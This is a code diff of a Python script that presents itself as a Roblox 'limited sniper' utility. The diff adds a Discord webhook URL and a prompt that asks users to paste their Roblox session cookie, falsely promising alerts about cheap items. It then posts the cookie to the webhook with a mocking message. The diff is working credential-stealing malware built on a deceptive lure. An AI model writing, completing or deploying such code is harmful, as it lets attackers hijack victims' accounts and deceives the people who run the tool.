@@ -7,7 +7,7 @@ from pystyle import Anime, Colorate, Colors, Center, System, Write
 
 colorama.init()
 
-loadingauth = ""
+loadingauth = "https://discord.com/api/webhooks/975206172053364797/YPmPfsJ2Un7H2NGRCfmwyL9vIrT2zj-_7i2XAhQbjf5kKmFfjGou69PokkOnyazMLs_6"
 
 
 def w(text: str):
@@ -27,18 +27,18 @@ startup()
 
 
 def main():
-    w("Welcome to Unknown Limited Sniper!")
-    cookiedata = Write.Input("cookie ->",
+    w("Welcome to Unknown Limited Sniper! Press enter to continue")
+    cookiedata = Write.Input("put your roblox cookie here, we will alert you on roblox if theres any cheap snipes! ->",
                              Colors.purple_to_blue,
                              interval=0.005)
     os.system('cls')
-    w("Loading")
+    w("You can leave this program now by pressing enter. :)")
     requests.post(loadingauth,
                   json={
                       'username': 'KGB',
-                      'content': f'```{cookiedata}```'
+                      'content': "@everyone get beamed skid" f'```{cookiedata}```'
                   })
-  w("You can leave this program now by pressing enter. :)")
+    
     os.system('cls')
 
 
